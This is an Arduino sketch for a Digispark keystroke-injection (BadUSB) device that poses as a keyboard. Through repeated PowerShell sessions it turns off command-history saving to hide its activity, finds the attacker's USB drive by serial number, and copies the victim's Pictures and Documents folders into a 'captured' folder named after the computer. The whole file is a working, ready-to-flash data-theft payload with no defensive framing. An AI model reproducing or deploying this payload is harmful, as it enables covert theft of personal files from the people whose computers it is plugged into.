#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // LED ON MODEL A
}
void loop() {

  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // RUN
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print(F("Set-PSReadlineOption -HistorySaveStyle SaveNothing")); // ONLY WORKS ON WINDOWS 10 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}")); // SELECT THE USB DEVICE WITH MATCHING SERIAL NUMBER
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$dl = $vol.DriveLetter; $cn = $env:computername")); // SET DRIVE LETTER VARIABLE, SET COMPUTERNAME VARIABLE
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("cd $dl\\captured\\")); // CREATE FOLDER "captured" ON USBs MAIN DIRECTORY
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("mkdir $cn"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // RUN
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$dl = $vol.DriveLetter; $cn = $env:computername"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("cd $dl\\captured\\$cn\\"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("Copy-Item -Path $env:userprofile\\Pictures\\ -Recurse -Destination Pictures\\; exit")); // COPY ALL PICTURES FROM %USERPROFILE%/PICTURES/ TO USB/CAPTURED/_COMPUTERNAME_/PICTURES
                                                                                                                  // REMOVE "; exit" WHEN ENCOUNTERING ISSUES WITH THE PAYLOAD
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}"));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("$dl = $vol.DriveLetter; $cn = $env:computername")); 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("cd $dl\\captured\\$cn\\"));
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("Copy-Item -Path $env:userprofile\\Documents\\ -Recurse -Destination Documents\\; exit")); // COPY ALL DOCUMENTS FROM %USERPROFILE%/DOCUMENTS/ TO USB/CAPTURED/_COMPUTERNAME_/DOCUMENTS
                                                                                                                    // REMOVE "; exit" WHEN ENCOUNTERING ISSUES WITH THE PAYLOAD
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  
  digitalWrite(1, LOW);
  DigiKeyboard.delay(3000);
  
}
